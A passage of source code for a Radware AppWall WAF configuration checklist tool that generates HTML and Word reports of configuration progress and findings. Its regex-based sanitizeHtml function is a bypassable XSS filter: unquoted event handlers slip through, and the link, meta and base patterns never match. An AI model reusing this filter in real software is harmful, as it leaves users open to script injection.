            font-style: italic;
        }
        
        .technique-card {
            background-color: #f9fafb;
            border: 1px solid #e5e7eb;
            border-radius: 0.5rem;
            margin-bottom: 1.5rem;
            overflow: hidden;
        }
        
        .technique-header {
            padding: 1rem;
            background-color: #f3f4f6;
            border-bottom: 1px solid #e5e7eb;
            font-weight: 600;
        }
        
        .technique-body {
            padding: 1rem;
        }
        
        .technique-content {
            font-size: 0.875rem;
            margin-bottom: 1rem;
        }
        
        .code-block {
            background-color: #1e293b;
            color: #e2e8f0;
            padding: 1rem;
            border-radius: 0.375rem;
            font-family: monospace;
            white-space: pre-wrap;
            font-size: 0.75rem;
            overflow-x: auto;
            margin: 1rem 0;
        }
        
        .report-footer {
            text-align: center;
            padding: 2rem;
            border-top: 1px solid #e5e7eb;
            color: #6b7280;
            font-size: 0.875rem;
        }
        
        @media print {
            body {
                padding: 0;
                background-color: white;
            }
            
            .container {
                box-shadow: none;
                max-width: none;
            }
            
            .section {
                page-break-inside: avoid;
            }
            
            .finding-card, .category-card, .technique-card {
                page-break-inside: avoid;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="report-header">
            <h1 class="report-title">${escapeHtml(reportTitle)}</h1>
            <p class="report-subtitle">Radware AppWall WAF Configuration Status</p>
            <div class="report-date">Generated on ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}</div>
        </header>
        
        <div class="report-body">
`;
    
    // Add executive summary section
    html += buildSummarySection(metrics);
    
    // Add detailed sections based on selected format
    if (reportFormat === 'detailed' || reportFormat === 'executive') {
        html += buildCompletionSection(metrics);
        
        if (includeCharts) {
            html += buildChartsSection(metrics);
        }
    }
    
    // Add findings section if selected
    if (includeFindings && (reportFormat === 'detailed' || reportFormat === 'findings')) {
        html += buildFindingsSection();
    }
    
    // Add detailed configuration status if detailed report
    if (reportFormat === 'detailed') {
        html += buildDetailedConfigSection(metrics, includeTechniques);
    }
    
    // Close report body and add footer
    html += `
        </div>
        
        <footer class="report-footer">
            <p>Generated by Radware AppWall WAF Configuration Checklist Tool</p>
            <p>Â© ${new Date().getFullYear()} Radware Ltd. All rights reserved.</p>
        </footer>
    </div>
</body>
</html>
`;
    
    return html;
}

// Calculate metrics for the report
function calculateReportMetrics() {
    const metrics = {
        overallCompletion: 0,
        criticalCompletion: 0,
        criticalTotal: 0,
        criticalCompleted: 0,
        highTotal: 0,
        highCompleted: 0,
        mediumTotal: 0,
        mediumCompleted: 0,
        lowTotal: 0,
        lowCompleted: 0,
        categories: [],
        totalTasks: 0,
        completedTasks: 0,
        naCount: 0
    };
    
    // Calculate task statistics
    appwallData.categories.forEach(category => {
        const categoryStats = {
            id: category.id,
            title: category.title,
            subtitle: category.subtitle,
            priority: category.priority,
            total: 0,
            completed: 0,
            notStarted: 0,
            na: 0,
            groups: []
        };
        
        category.checklist.forEach(group => {
            const groupStats = {
                title: group.title,
                items: []
            };
            
            group.items.forEach(item => {
                metrics.totalTasks++;
                categoryStats.total++;
                
                // Get item status
                const status = currentProject && currentProject.taskStatus ? 
                    currentProject.taskStatus[item.id] || TASK_STATUS.NOT_TESTED : TASK_STATUS.NOT_TESTED;
                
                // Count by priority
                if (item.priority === 'critical') {
                    metrics.criticalTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.criticalCompleted++;
                } else if (item.priority === 'high') {
                    metrics.highTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.highCompleted++;
                } else if (item.priority === 'medium') {
                    metrics.mediumTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.mediumCompleted++;
                } else if (item.priority === 'low') {
                    metrics.lowTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.lowCompleted++;
                }
                
                // Count by status
                if (status === TASK_STATUS.PASSED) {
                    metrics.completedTasks++;
                    categoryStats.completed++;
                } else if (status === TASK_STATUS.NA) {
                    metrics.naCount++;
                    categoryStats.na++;
                } else {
                    categoryStats.notStarted++;
                }
                
                // Add item to group stats
                groupStats.items.push({
                    id: item.id,
                    text: item.text,
                    priority: item.priority,
                    status: status
                });
            });
            
            categoryStats.groups.push(groupStats);
        });
        
        // Calculate completion percentage
        categoryStats.percentage = categoryStats.total > 0 
            ? Math.round((categoryStats.completed / categoryStats.total) * 100) 
            : 0;
            
        metrics.categories.push(categoryStats);
    });
    
    // Calculate overall completion percentage
    metrics.overallCompletion = metrics.totalTasks > 0 
        ? Math.round((metrics.completedTasks / metrics.totalTasks) * 100) 
        : 0;
        
    // Calculate critical items completion percentage
    metrics.criticalCompletion = metrics.criticalTotal > 0 
        ? Math.round((metrics.criticalCompleted / metrics.criticalTotal) * 100) 
        : 0;
    
    return metrics;
}

// Build the summary section of the report
function buildSummarySection(metrics) {
    let html = `
        <section class="section">
            <h2 class="section-title">Executive Summary</h2>
            
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Project Name</div>
                    <div class="info-value">${currentProject ? escapeHtml(currentProject.name) : 'Unknown Project'}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Environment Target</div>
                    <div class="info-value">${currentProject ? escapeHtml(currentProject.target) : 'N/A'}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Security Engineer</div>
                    <div class="info-value">${currentProject ? escapeHtml(currentProject.tester) : 'N/A'}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Start Date</div>
                    <div class="info-value">${currentProject ? formatDate(new Date(currentProject.date)) : 'N/A'}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Last Updated</div>
                    <div class="info-value">${currentProject && currentProject.lastUpdated ? formatDate(new Date(currentProject.lastUpdated)) : 'N/A'}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Protected Applications</div>
                    <div class="info-value">${currentProject ? escapeHtml(currentProject.scope) : 'N/A'}</div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-header">
                    <div class="progress-label">Overall Configuration Completion</div>
                    <div class="progress-value">${metrics.overallCompletion}%</div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${metrics.overallCompletion}%"></div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-header">
                    <div class="progress-label">Critical Settings Completion</div>
                    <div class="progress-value">${metrics.criticalCompletion}% (${metrics.criticalCompleted}/${metrics.criticalTotal})</div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill critical" style="width: ${metrics.criticalCompletion}%"></div>
                </div>
            </div>
            
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Configuration Status</th>
                            <th>Count</th>
                            <th>Percentage</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Completed Items</td>
                            <td>${metrics.completedTasks}</td>
                            <td>${metrics.overallCompletion}%</td>
                        </tr>
                        <tr>
                            <td>Not Started Items</td>
                            <td>${metrics.totalTasks - metrics.completedTasks - metrics.naCount}</td>
                            <td>${Math.round(((metrics.totalTasks - metrics.completedTasks - metrics.naCount) / metrics.totalTasks) * 100)}%</td>
                        </tr>
                        <tr>
                            <td>Not Applicable Items</td>
                            <td>${metrics.naCount}</td>
                            <td>${Math.round((metrics.naCount / metrics.totalTasks) * 100)}%</td>
                        </tr>
                        <tr>
                            <td><strong>Total Items</strong></td>
                            <td><strong>${metrics.totalTasks}</strong></td>
                            <td><strong>100%</strong></td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Configuration Issues</div>
                    <div class="info-value">${appwallData.findings ? appwallData.findings.length : 0} issues found</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Security Categories</div>
                    <div class="info-value">${metrics.categories.length} categories configured</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Critical Items Status</div>
                    <div class="info-value">${metrics.criticalCompleted}/${metrics.criticalTotal} completed</div>
                </div>
            </div>
        </section>
    `;
    
    return html;
}

// Build the completion section of the report
function buildCompletionSection(metrics) {
    let html = `
        <section class="section">
            <h2 class="section-title">Configuration Completion Status</h2>
            
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Priority</th>
                            <th>Completion</th>
                            <th>Critical Items</th>
                            <th>High Items</th>
                            <th>Medium Items</th>
                        </tr>
                    </thead>
                    <tbody>
    `;
    
    // Add each category row
    metrics.categories.forEach(category => {
        let criticalCount = 0;
        let criticalComplete = 0;
        let highCount = 0;
        let highComplete = 0;
        let mediumCount = 0;
        let mediumComplete = 0;
        
        // Count items by priority
        category.groups.forEach(group => {
            group.items.forEach(item => {
                if (item.priority === 'critical') {
                    criticalCount++;
                    if (item.status === TASK_STATUS.PASSED) criticalComplete++;
                } else if (item.priority === 'high') {
                    highCount++;
                    if (item.status === TASK_STATUS.PASSED) highComplete++;
                } else if (item.priority === 'medium') {
                    mediumCount++;
                    if (item.status === TASK_STATUS.PASSED) mediumComplete++;
                }
            });
        });
        
        html += `
                        <tr>
                            <td>${escapeHtml(category.title)}</td>
                            <td><span class="badge badge-${category.priority}">${capitalizeFirstLetter(category.priority)}</span></td>
                            <td>${category.percentage}%</td>
                            <td>${criticalComplete}/${criticalCount}</td>
                            <td>${highComplete}/${highCount}</td>
                            <td>${mediumComplete}/${mediumCount}</td>
                        </tr>
        `;
    });
    
    html += `
                    </tbody>
                </table>
            </div>
        </section>
    `;
    
    return html;
}

// Build the charts section of the report
function buildChartsSection(metrics) {
    let html = `
        <section class="section">
            <h2 class="section-title">Configuration Visualizations</h2>
            
            <div class="charts-container">
                <div class="chart-card">
                    <div class="chart-header">Category Completion</div>
                    <div class="chart-body">
                        <div class="chart-placeholder">
                            [Category completion chart would appear here in a browser environment]
                        </div>
                    </div>
                </div>
                
                <div class="chart-card">
                    <div class="chart-header">Priority Distribution</div>
                    <div class="chart-body">
                        <div class="chart-placeholder">
                            [Priority distribution chart would appear here in a browser environment]
                        </div>
                    </div>
                </div>
            </div>
            
            <p style="text-align: center; color: #6b7280; font-style: italic; margin-top: -1rem;">
                Note: Interactive charts are available in the dashboard view of the application.
            </p>
        </section>
    `;
    
    return html;
}

// Build the findings section of the report
function buildFindingsSection() {
    if (!appwallData.findings || appwallData.findings.length === 0) {
        return `
            <section class="section">
                <h2 class="section-title">Configuration Issues</h2>
                <p style="text-align: center; padding: 2rem;">
                    No configuration issues have been documented.
                </p>
            </section>
        `;
    }
    
    let html = `
        <section class="section">
            <h2 class="section-title">Configuration Issues</h2>
            
            <div class="info-grid" style="grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));">
                <div class="info-item">
                    <div class="info-label">High Severity</div>
                    <div class="info-value">${appwallData.findings.filter(f => f.severity === 'high').length}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Medium Severity</div>
                    <div class="info-value">${appwallData.findings.filter(f => f.severity === 'medium').length}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Low Severity</div>
                    <div class="info-value">${appwallData.findings.filter(f => f.severity === 'low').length}</div>
                </div>
                
                <div class="info-item">
                    <div class="info-label">Total Issues</div>
                    <div class="info-value">${appwallData.findings.length}</div>
                </div>
            </div>
    `;
    
    // Sort findings by severity
    const sortedFindings = [...appwallData.findings].sort((a, b) => {
        const severityOrder = { 'high': 0, 'medium': 1, 'low': 2, 'info': 3 };
        return severityOrder[a.severity] - severityOrder[b.severity];
    });
    
    // Add each finding
    sortedFindings.forEach(finding => {
        html += `
            <div class="finding-card">
                <div class="finding-header">
                    <div class="finding-title">
                        ${escapeHtml(finding.title)}
                        <span class="badge badge-${finding.severity}">${capitalizeFirstLetter(finding.severity)}</span>
                    </div>
                </div>
                <div class="finding-body">
                    <div class="finding-section">
                        <div class="finding-label">Category</div>
                        <div class="finding-value">${escapeHtml(getCategoryTitle(finding.category))}</div>
                    </div>
                    
                    <div class="finding-section">
                        <div class="finding-label">Description</div>
                        <div class="finding-value">${escapeHtml(finding.description)}</div>
                    </div>
                    
                    <div class="finding-section">
                        <div class="finding-label">Recommended Remediation</div>
                        <div class="finding-value">${escapeHtml(finding.remediation)}</div>
                    </div>
                    
                    ${finding.config ? `
                    <div class="finding-section">
                        <div class="finding-label">Configuration Commands</div>
                        <pre class="finding-commands">${escapeHtml(finding.config)}</pre>
                    </div>
                    ` : ''}
                </div>
            </div>
        `;
    });
    
    html += `</section>`;
    
    return html;
}

// Build detailed configuration section of the report
function buildDetailedConfigSection(metrics, includeTechniques) {
    let html = `
        <section class="section">
            <h2 class="section-title">Detailed Configuration Status</h2>
    `;
    
    // Add each category
    metrics.categories.forEach(category => {
        const categoryObj = appwallData.categories.find(c => c.id === category.id);
        
        html += `
            <div class="category-card">
                <div class="category-header">
                    <div class="category-title">${escapeHtml(category.title)}</div>
                    <div class="category-priority">
                        <span class="badge badge-${category.priority}">${capitalizeFirstLetter(category.priority)} Priority</span>
                    </div>
                </div>
                
                <p style="margin-bottom: 1rem;">${escapeHtml(category.subtitle)}</p>
                
                <div class="progress-container">
                    <div class="progress-header">
                        <div class="progress-label">Completion Status</div>
                        <div class="progress-value">${category.percentage}% (${category.completed}/${category.total})</div>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: ${category.percentage}%"></div>
                    </div>
                </div>
        `;
        
        // Add checklist groups
        category.groups.forEach(group => {
            html += `
                <div style="margin-top: 1.5rem; margin-bottom: 0.5rem; font-weight: 600;">${escapeHtml(group.title)}</div>
                <div style="border: 1px solid #e5e7eb; border-radius: 0.375rem; overflow: hidden;">
            `;
            
            // Add checklist items
            group.items.forEach(item => {
                let statusClass, statusLabel, statusIcon;
                
                if (item.status === TASK_STATUS.PASSED) {
                    statusClass = 'completed';
                    statusLabel = 'Completed';
                    statusIcon = 'â';
                } else if (item.status === TASK_STATUS.NA) {
                    statusClass = 'na';
                    statusLabel = 'Not Applicable';
                    statusIcon = 'N/A';
                } else {
                    statusClass = 'notstarted';
                    statusLabel = 'Not Started';
                    statusIcon = 'â';
                }
                
                html += `
                    <div class="checklist-item">
                        <div class="checklist-status">
                            <div class="status-icon status-${statusClass}" title="${statusLabel}">${statusIcon}</div>
                        </div>
                        <div class="checklist-text">
                            <span>${escapeHtml(item.text)}</span>
                            <span class="badge badge-${item.priority}" style="margin-left: 0.5rem;">${capitalizeFirstLetter(item.priority)}</span>
                        </div>
                    </div>
                `;
            });
            
            html += `</div>`;
        });
        
        // Add techniques if requested and available
        if (includeTechniques && categoryObj && categoryObj.techniques && categoryObj.techniques.length > 0) {
            html += `<h3 style="margin-top: 1.5rem; font-weight: 600; font-size: 1.125rem;">Configuration Techniques</h3>`;
            
            categoryObj.techniques.forEach(technique => {
                html += `
                    <div class="technique-card">
                        <div class="technique-header">${escapeHtml(technique.title)}</div>
                        <div class="technique-body">
                            <div class="technique-content">
                                ${sanitizeHtml(technique.content)}
                            </div>
                        </div>
                    </div>
                `;
            });
        }
        
        // Add notes if available
        if (currentProject && currentProject.notes && currentProject.notes[category.id]) {
            html += `
                <div style="margin-top: 1.5rem; padding: 1rem; background-color: #f3f4f6; border-radius: 0.375rem;">
                    <div style="font-weight: 600; margin-bottom: 0.5rem;">Configuration Notes</div>
                    <div style="white-space: pre-wrap; font-size: 0.875rem;">${escapeHtml(currentProject.notes[category.id])}</div>
                </div>
            `;
        }
        
        html += `</div>`;
    });
    
    html += `</section>`;
    
    return html;
}

// Download the HTML report
function downloadHTMLReport(html, reportTitle) {
    // Create a blob from the HTML
    const blob = new Blob([html], { type: 'text/html' });
    
    // Create a safe filename
    const filename = reportTitle
        .replace(/[^a-z0-9]/gi, '_')
        .replace(/_+/g, '_')
        .toLowerCase() + '_' + formatDateForFilename(new Date()) + '.html';
    
    // Create a download link
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    
    // Trigger download and clean up
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// Format date for filename
function formatDateForFilename(date) {
    return `${date.getFullYear()}-${(date.getMonth() + 1).toString().padStart(2, '0')}-${date.getDate().toString().padStart(2, '0')}`;
}

// Escape HTML to prevent XSS
function escapeHtml(text) {
    if (!text) return '';
    return text
        .toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// Basic HTML sanitization for technique content
function sanitizeHtml(html) {
    if (!html) return '';
    
    // Remove potentially dangerous tags and attributes
    return html
        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
        .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
        .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
        .replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '')
        .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
        .replace(/<link\b[^<]*(?:(?!<\/link>)<[^<]*)*<\/link>/gi, '')
        .replace(/<meta\b[^<]*(?:(?!<\/meta>)<[^<]*)*<\/meta>/gi, '')
        .replace(/<base\b[^<]*(?:(?!<\/base>)<[^<]*)*<\/base>/gi, '')
        .replace(/on\w+="[^"]*"/gi, '')
        .replace(/on\w+='[^']*'/gi, '')
        .replace(/javascript:/gi, '');
}</script>







<script src="https://unpkg.com/docx@7.1.0/build/index.js"></script>

<script>// --- Word Document Report Generation Functionality ---

// --- Word Document Report Generation Functionality ---
// --- Enhanced Word Document Report Generation Functionality ---

// Add floating Word export button when page loads
document.addEventListener('DOMContentLoaded', function() {
    addWordExportButton();
    loadDocxLibrary();
});

// Dynamically load required libraries if needed
function loadDocxLibrary() {
    if (typeof docx === 'undefined') {
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/docx@7.1.0/build/index.js';
        script.async = true;
        script.onload = () => console.log('docx.js library loaded successfully');
        script.onerror = () => console.error('Failed to load docx.js library');
        document.head.appendChild(script);
    }
    
    // Optionally load FileSaver for better download compatibility
    if (typeof saveAs === 'undefined') {
        const fileSaver = document.createElement('script');
        fileSaver.src = 'https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js';
        fileSaver.async = true;
        document.head.appendChild(fileSaver);
    }
}

// Add floating Word export button 
function addWordExportButton() {
    const button = document.createElement('button');
    button.id = 'word-export-btn';
    button.className = 'fixed bottom-24 right-6 z-40 bg-blue-600 hover:bg-blue-700 text-white rounded-full w-14 h-14 flex items-center justify-center shadow-lg transition-all transform hover:scale-110';
    button.innerHTML = '<i class="fas fa-file-word text-xl"></i>';
    button.setAttribute('title', 'Export to Word');
    document.body.appendChild(button);
    
    // Add tooltip
    const tooltip = document.createElement('div');
    tooltip.className = 'absolute right-16 bg-gray-800 text-white text-sm py-1 px-2 rounded opacity-0 invisible transition-all duration-200';
    tooltip.textContent = 'Export to Word';
    tooltip.style.whiteSpace = 'nowrap';
    button.appendChild(tooltip);
    
    // Show/hide tooltip on hover
    button.addEventListener('mouseenter', () => {
        tooltip.classList.remove('opacity-0', 'invisible');
        tooltip.classList.add('opacity-100', 'visible');
    });
    
    button.addEventListener('mouseleave', () => {
        tooltip.classList.add('opacity-0', 'invisible');
        tooltip.classList.remove('opacity-100', 'visible');
    });
    
    // Add CSS for button hover effect
    const style = document.createElement('style');
    style.textContent = `
        #word-export-btn:hover {
            box-shadow: 0 0 15px rgba(37, 99, 235, 0.5);
        }
        @keyframes pulse-border-blue {
            0% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(37, 99, 235, 0); }
            100% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
        }
        #word-export-btn {
            animation: pulse-border-blue 2s infinite;
        }
    `;
    document.head.appendChild(style);
    
    // Add click handler
    button.addEventListener('click', function() {
        showWordReportModal();
    });
}

// Show Word report generation options modal
function showWordReportModal() {
    // Create modal if it doesn't exist
    if (!document.getElementById('word-report-modal')) {
        createWordReportModal();
    }
    
    toggleModal('word-report-modal', true);
}

// Create Word report modal
function createWordReportModal() {
    const modal = document.createElement('div');
    modal.id = 'word-report-modal';
    modal.className = 'fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm';
    
    modal.innerHTML = `
        <div class="bg-white rounded-xl shadow-2xl max-w-lg w-full">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center bg-gradient-to-r from-blue-700 to-blue-500 text-white rounded-t-xl">
                <h3 class="text-xl font-semibold">Generate Word Report</h3>
                <button class="modal-close text-white/80 hover:text-white">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="mb-5">
                    <p class="text-gray-700 mb-3">Generate a professional Word document report of your WAF configuration.</p>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label for="word-report-format" class="block text-sm font-medium text-gray-700 mb-1">Report Format</label>
                        <select id="word-report-format" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-blue-500 focus:ring focus:ring-blue-200 transition">
                            <option value="detailed">Detailed Report (Complete Configuration)</option>
                            <option value="executive">Executive Summary (Key Metrics)</option>
                            <option value="findings">Findings Only (Configuration Issues)</option>
                        </select>
                    </div>
                    
                    <div>
                        <label for="word-report-title" class="block text-sm font-medium text-gray-700 mb-1">Report Title</label>
                        <input type="text" id="word-report-title" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-blue-500 focus:ring focus:ring-blue-200 transition" 
                            value="Radware AppWall WAF Configuration Report" placeholder="Enter report title">
                    </div>
                    
                    <div class="pt-2 space-y-2">
                        <label class="flex items-center">
                            <input type="checkbox" id="word-include-cover" class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" checked>
                            <span class="ml-2 text-sm text-gray-700">Include cover page</span>
                        </label>
                        
                        <label class="flex items-center">
                            <input type="checkbox" id="word-include-toc" class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" checked>
                            <span class="ml-2 text-sm text-gray-700">Include table of contents</span>
                        </label>
                        
                        <label class="flex items-center">
                            <input type="checkbox" id="word-include-findings" class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" checked>
                            <span class="ml-2 text-sm text-gray-700">Include configuration issues</span>
                        </label>
                        
                        <label class="flex items-center">
                            <input type="checkbox" id="word-include-techniques" class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" checked>
                            <span class="ml-2 text-sm text-gray-700">Include configuration techniques</span>
                        </label>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-between items-center bg-gray-50 rounded-b-xl">
                <div id="word-generation-status" class="text-sm text-gray-500 hidden">
                    <div class="flex items-center">
                        <div class="animate-spin mr-2 h-4 w-4 border-2 border-blue-500 border-t-transparent rounded-full"></div>
                        <span>Generating Word document...</span>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">
                        Cancel
                    </button>
                    <button id="btn-generate-word-report" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition flex items-center gap-2">
                        <i class="fas fa-file-word"></i> Generate Word Report
                    </button>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Set up event listeners
    const closeButtons = modal.querySelectorAll('.modal-close');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            toggleModal('word-report-modal', false);
        });
    });
    
    document.getElementById('btn-generate-word-report').addEventListener('click', function() {
        generateEnhancedWordReport();
    });
}

// Generate enhanced Word document report with better formatting
async function generateEnhancedWordReport() {
    try {
        // Check if docx library is available
        if (typeof docx === 'undefined') {
            throw new Error("Word document library not loaded. Please refresh and try again.");
        }
        
        // Show generation status
        const statusElement = document.getElementById('word-generation-status');
        const generateButton = document.getElementById('btn-generate-word-report');
        statusElement.classList.remove('hidden');
        generateButton.disabled = true;
        
        // Get report options
        const reportFormat = document.getElementById('word-report-format').value;
        const reportTitle = document.getElementById('word-report-title').value || 'Radware AppWall WAF Configuration Report';
        const includeCover = document.getElementById('word-include-cover')?.checked ?? true;
        const includeToc = document.getElementById('word-include-toc')?.checked ?? true;
        const includeFindings = document.getElementById('word-include-findings').checked;
        const includeTechniques = document.getElementById('word-include-techniques').checked;
        
        // Create document with styles
        const doc = new docx.Document({
            creator: "Radware AppWall WAF Checklist Tool",
            description: "WAF Configuration Report",
            title: reportTitle,
            styles: {
                paragraphStyles: [
                    {
                        id: "Heading1",
                        name: "Heading 1",
                        basedOn: "Normal",
                        next: "Normal",
                        quickFormat: true,
                        run: {
                            size: 32,
                            bold: true,
                            color: "2F5496"
                        },
                        paragraph: {
                            spacing: {
                                before: 340,
                                after: 170
                            }
                        }
                    },
                    {
                        id: "Heading2",
                        name: "Heading 2",
                        basedOn: "Normal",
                        next: "Normal",
                        quickFormat: true,
                        run: {
                            size: 26,
                            bold: true,
                            color: "2F5496"
                        },
                        paragraph: {
                            spacing: {
                                before: 240,
                                after: 120
                            }
                        }
                    },
                    {
                        id: "Heading3",
                        name: "Heading 3",
                        basedOn: "Normal",
                        next: "Normal",
                        quickFormat: true,
                        run: {
                            size: 22,
                            bold: true,
                            color: "2F5496"
                        },
                        paragraph: {
                            spacing: {
                                before: 240,
                                after: 120
                            }
                        }
                    },
                    {
                        id: "CodeBlock",
                        name: "Code Block",
                        basedOn: "Normal",
                        next: "Normal",
                        quickFormat: true,
                        run: {
                            font: "Courier New",
                            size: 20
                        },
                        paragraph: {
                            spacing: {
                                before: 120,
                                after: 120
                            },
                            indent: {
                                left: 720 // 0.5 inch
                            }
                        }
                    }
                ]
            }
        });
        
        // Create children array for content
        let children = [];
        
        // Add cover page if requested
        if (includeCover) {
            children = children.concat(createCoverPage(reportTitle));
        }
        
        // Add table of contents if requested
        if (includeToc) {
            children.push(
                new docx.TableOfContents("Table of Contents", {
                    hyperlink: true,
                    headingStyleRange: "1-3"
                }),
                new docx.Paragraph({
                    text: "",
                    pageBreakBefore: true
                })
            );
        }
        
        // Calculate metrics for the report
        const metrics = calculateReportMetrics();
        
        // Add executive summary section
        children = children.concat(createExecutiveSummary(metrics, reportTitle));
        
        // Add findings section if requested
        if (includeFindings && (reportFormat === 'findings' || reportFormat === 'detailed')) {
            children = children.concat(createFindingsSection());
        }
        
        // Add detailed configuration sections if detailed report
        if (reportFormat === 'detailed') {
            children = children.concat(createDetailedConfigurationSections(metrics, includeTechniques));
        }
        
        // Add all content to document
        doc.addSection({
            properties: {
                page: {
                    margin: {
                        top: 1440, // 1 inch
                        right: 1440,
                        bottom: 1440,
                        left: 1440
                    }
                }
            },
            children: children
        });
        
        // Generate the document using Blob (browser compatible)
        docx.Packer.toBlob(doc).then(blob => {
            // Create safe filename
            const filename = reportTitle
                .replace(/[^a-z0-9]/gi, '_')
                .replace(/_+/g, '_')
                .toLowerCase() + '_' + formatDateForFilename(new Date()) + '.docx';
            
            // Use FileSaver.js if available, otherwise use basic method
            if (typeof saveAs !== 'undefined') {
                saveAs(blob, filename);
            } else {
                // Fallback method
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                document.body.appendChild(a);
                a.style.display = 'none';
                a.href = url;
                a.download = filename;
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
            }
            
            // Show success message
            showToast('Word report generated successfully', 'success');
            
            // Close modal
            toggleModal('word-report-modal', false);
        }).catch(error => {
            console.error('Error packing document:', error);
            showToast('Error creating document: ' + error.message, 'error');
        }).finally(() => {
            // Reset UI
            statusElement.classList.add('hidden');
            generateButton.disabled = false;
        });
    } catch (error) {
        console.error('Error generating Word document:', error);
        
        // Reset UI
        document.getElementById('word-generation-status').classList.add('hidden');
        document.getElementById('btn-generate-word-report').disabled = false;
        
        // Show error message
        showToast('Error generating Word report: ' + error.message, 'error');
    }
}

// Create cover page with better formatting
function createCoverPage(title) {
    return [
        new docx.Paragraph({
            text: "",
            spacing: {
                before: 2880 // 2 inches
            }
        }),
        new docx.Paragraph({
            text: title,
            heading: docx.HeadingLevel.HEADING_1,
            alignment: docx.AlignmentType.CENTER,
            spacing: {
                after: 400
            }
        }),
        new docx.Paragraph({
            text: "Radware AppWall WAF Configuration Status",
            alignment: docx.AlignmentType.CENTER,
            spacing: {
                after: 800
            }
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "Generated: ",
                    bold: true
                }),
                new docx.TextRun(`${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}`)
            ],
            alignment: docx.AlignmentType.CENTER
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "Project: ",
                    bold: true
                }),
                new docx.TextRun(currentProject ? currentProject.name : 'Unnamed Project')
            ],
            alignment: docx.AlignmentType.CENTER
        }),
        new docx.Paragraph({
            text: "",
            spacing: {
                after: 4000
            }
        }),
        new docx.Paragraph({
            text: "CONFIDENTIAL",
            alignment: docx.AlignmentType.CENTER,
            spacing: {
                after: 400
            }
        }),
        new docx.Paragraph({
            text: "Â© " + new Date().getFullYear() + " Radware Ltd. All rights reserved.",
            alignment: docx.AlignmentType.CENTER
        }),
        new docx.Paragraph({
            text: "",
            pageBreakBefore: true
        })
    ];
}

// Create executive summary section with enhanced formatting
function createExecutiveSummary(metrics, reportTitle) {
    // Build project info table
    const projectInfoTable = new docx.Table({
        width: {
            size: 100,
            type: docx.WidthType.PERCENTAGE,
        },
        borders: {
            top: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            right: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            bottom: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            left: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            insideHorizontal: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
